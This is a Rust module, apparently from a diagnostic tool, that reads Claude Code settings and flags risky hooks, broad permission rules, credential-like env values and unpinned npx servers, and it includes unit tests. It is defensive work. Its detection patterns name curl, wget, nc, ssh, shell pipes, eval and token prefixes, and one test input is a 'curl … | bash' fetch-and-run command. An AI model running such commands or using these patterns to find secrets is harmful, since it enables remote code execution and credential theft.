//! The security surface Claude Code runs on this machine, as facts: hooks that execute on
//! every turn, MCP servers that get a process or a socket, permission rules that decide what
//! runs unasked, and env values that may be tokens. Gathered here, classified by Doctor.
//!
//! Nothing is repaired — a permission is a decision, and loosening or tightening one behind
//! the user's back is worse than either state. Doctor says what it sees, with the line.

use serde_json::Value;

#[derive(Clone, Debug, Default)]
pub struct HookFact {
    pub event: String,
    pub command: String,
}

#[derive(Clone, Debug, Default)]
pub struct McpFact {
    pub name: String,
    /// The command line, or the URL for a remote server.
    pub spec: String,
}

#[derive(Clone, Debug, Default)]
pub struct SecurityFacts {
    pub settings_found: bool,
    pub hooks: Vec<HookFact>,
    pub allow: Vec<String>,
    pub deny: Vec<String>,
    pub mcp: Vec<McpFact>,
    /// `env` keys in settings.json whose value looks like a credential.
    pub env_secretish: Vec<String>,
}

fn read_json(path: &std::path::Path) -> Option<Value> {
    serde_json::from_str(&std::fs::read_to_string(path).ok()?).ok()
}

pub fn gather() -> SecurityFacts {
    let home = crate::config::home();
    let mut out = SecurityFacts::default();
    if let Some(s) = read_json(&home.join(".claude").join("settings.json")) {
        out.settings_found = true;
        if let Some(hooks) = s.get("hooks").and_then(Value::as_object) {
            for (event, groups) in hooks {
                for g in groups.as_array().into_iter().flatten() {
                    for h in g.get("hooks").and_then(Value::as_array).into_iter().flatten() {
                        if let Some(c) = h.get("command").and_then(Value::as_str) {
                            out.hooks.push(HookFact { event: event.clone(), command: c.to_string() });
                        }
                    }
                }
            }
        }
        let rules = |k: &str| -> Vec<String> {
            s.get("permissions")
                .and_then(|p| p.get(k))
                .and_then(Value::as_array)
                .map(|a| a.iter().filter_map(Value::as_str).map(str::to_string).collect())
                .unwrap_or_default()
        };
        out.allow = rules("allow");
        out.deny = rules("deny");
        if let Some(env) = s.get("env").and_then(Value::as_object) {
            for (k, v) in env {
                if v.as_str().is_some_and(secretish) {
                    out.env_secretish.push(k.clone());
                }
            }
        }
    }
    if let Some(c) = read_json(&home.join(".claude.json")) {
        if let Some(servers) = c.get("mcpServers").and_then(Value::as_object) {
            for (name, def) in servers {
                let spec = match (def.get("url").and_then(Value::as_str), def.get("command").and_then(Value::as_str)) {
                    (Some(u), _) => u.to_string(),
                    (None, Some(cmd)) => {
                        let args: Vec<&str> = def.get("args").and_then(Value::as_array)
                            .map(|a| a.iter().filter_map(Value::as_str).collect()).unwrap_or_default();
                        std::iter::once(cmd).chain(args).collect::<Vec<_>>().join(" ")
                    }
                    _ => String::new(),
                };
                out.mcp.push(McpFact { name: name.clone(), spec });
            }
        }
    }
    out
}

// ── Pure predicates, each the reason it fires ──

/// An `allow` rule that lets a whole class of destructive or network commands run unasked.
pub fn broad_allow(rule: &str) -> Option<&'static str> {
    let r = rule.trim();
    let bare = |tool: &str| r == tool || r == format!("{tool}(*)") || r == format!("{tool}(**)") || r == format!("{tool}(*:*)");
    if bare("Bash") { return Some("every shell command runs without asking"); }
    if bare("Write") || bare("Edit") || bare("MultiEdit") { return Some("any file on disk can be rewritten without asking"); }
    for (prefix, why) in [
        ("Bash(sudo", "root commands run without asking"),
        ("Bash(rm ", "deletions run without asking"),
        ("Bash(rm:", "deletions run without asking"),
        ("Bash(curl", "network fetches run without asking — the usual first step of an exfiltration"),
        ("Bash(wget", "network fetches run without asking"),
        ("Bash(ssh", "remote shells open without asking"),
        ("Bash(git push", "pushes leave the machine without asking"),
    ] {
        if r.starts_with(prefix) { return Some(why); }
    }
    None
}

/// A hook command that reaches the network or evaluates text it did not ship with.
pub fn risky_hook(command: &str) -> Option<&'static str> {
    let c = command;
    let word = |w: &str| c.split(|ch: char| !ch.is_alphanumeric() && ch != '_' && ch != '-').any(|t| t == w);
    if word("curl") || word("wget") || word("nc") { return Some("fetches from the network on every turn it fires"); }
    if c.contains("| sh") || c.contains("| bash") || c.contains("|sh") || c.contains("|bash") { return Some("pipes text into a shell"); }
    if word("eval") { return Some("evaluates a string as code"); }
    None
}

/// A hook that runs a script from somewhere other than `~/.claude/hooks` — not wrong, but
/// worth knowing, since that is where the eye looks.
pub fn hook_outside_home(command: &str) -> Option<String> {
    let mut paths = command.split_whitespace().filter(|t| t.contains('/') && (t.ends_with(".py") || t.ends_with(".sh") || t.ends_with(".js")));
    let p = paths.next()?;
    let p = p.trim_matches(|ch| ch == '"' || ch == '\'');
    if p.contains(".claude/hooks") { return None; }
    Some(p.to_string())
}

/// A value shaped like a credential: known prefixes, or a long opaque token.
pub fn secretish(v: &str) -> bool {
    let t = v.trim();
    for pre in ["sk-", "ghp_", "gho_", "github_pat_", "xoxb-", "xoxp-", "AKIA", "glpat-", "ya29."] {
        if t.starts_with(pre) { return true; }
    }
    t.len() >= 32 && !t.contains(' ') && !t.contains('/') && t.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '=')
}

/// `npx <pkg>` with no version: fetched fresh from the registry every start.
pub fn unpinned_npx(spec: &str) -> bool {
    let toks: Vec<&str> = spec.split_whitespace().collect();
    let Some(i) = toks.iter().position(|t| *t == "npx") else { return false };
    let pkg = toks.iter().skip(i + 1).find(|t| !t.starts_with('-'));
    match pkg {
        Some(p) => { let v = p.trim_start_matches('@'); !v.contains('@') || v.ends_with("@latest") || v.ends_with("@next") }
        None => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_bare_bash_or_write_allow_is_flagged_and_a_scoped_one_is_not() {
        assert!(broad_allow("Bash(*)").is_some());
        assert!(broad_allow("Bash").is_some());
        assert!(broad_allow("Write(**)").is_some());
        assert!(broad_allow("Bash(sudo rm:*)").is_some());
        assert!(broad_allow("Bash(curl:*)").is_some());
        assert!(broad_allow("Bash(python3:*)").is_none(), "an interpreter scoped by name is her normal rule");
        assert!(broad_allow("Bash(ls ~/TomTom/FEAT/GOSDK-208184*)").is_none());
        assert!(broad_allow("Read(**/*.md)").is_none());
    }

    #[test]
    fn a_hook_that_fetches_or_pipes_into_a_shell_is_risky_and_a_local_script_is_not() {
        assert!(risky_hook("curl -s https://x | bash").is_some());
        assert!(risky_hook("python3 \"$HOME/.claude/hooks/pr_attach.py\"").is_none());
        assert!(risky_hook("IN=$(cat); printf '%s' \"$IN\" | grep -qE 'gh +pr' && echo ok").is_none(), "a pipe into grep is not a pipe into a shell");
        assert!(risky_hook("eval \"$X\"").is_some());
        assert!(risky_hook("echo '{\"systemMessage\": \"compaction\"}'").is_none());
    }

    #[test]
    fn a_script_outside_the_hooks_folder_is_named_and_one_inside_is_quiet() {
        assert_eq!(hook_outside_home("python3 /opt/tools/x.py"), Some("/opt/tools/x.py".into()));
        assert!(hook_outside_home("python3 \"$HOME/.claude/hooks/pr_attach.py\" 2>/dev/null; true").is_none());
        assert!(hook_outside_home("echo hi").is_none());
    }

    #[test]
    fn credential_shapes_are_recognised_and_ordinary_values_are_not() {
        assert!(secretish("ghp_abcdefghijklmnopqrstuvwxyz0123456789"));
        assert!(secretish("sk-ant-api03-xxxxxxxxxxxxxxxxxxxxxxxxxxxx"));
        assert!(secretish("QmFzZTY0TG9va2luZ1Rva2VuVmFsdWVIZXJlMTIzNDU2Nzg5"));
        assert!(!secretish("opusplan"));
        assert!(!secretish("/Users/me/.local/bin"));
        assert!(!secretish("a sentence with spaces that is long enough to pass the length"));
    }

    #[test]
    fn npx_without_a_version_is_unpinned_and_with_one_is_not() {
        assert!(unpinned_npx("npx @modelcontextprotocol/server-github"));
        assert!(unpinned_npx("npx -y some-server"));
        assert!(!unpinned_npx("npx @scope/pkg@1.2.3"));
        assert!(unpinned_npx("npx @playwright/mcp@latest"), "@latest is the moving tag, not a pin");
        assert!(!unpinned_npx("node /usr/local/lib/server.js"));
        assert!(!unpinned_npx("https://mcp.example.com/sse"));
    }
}
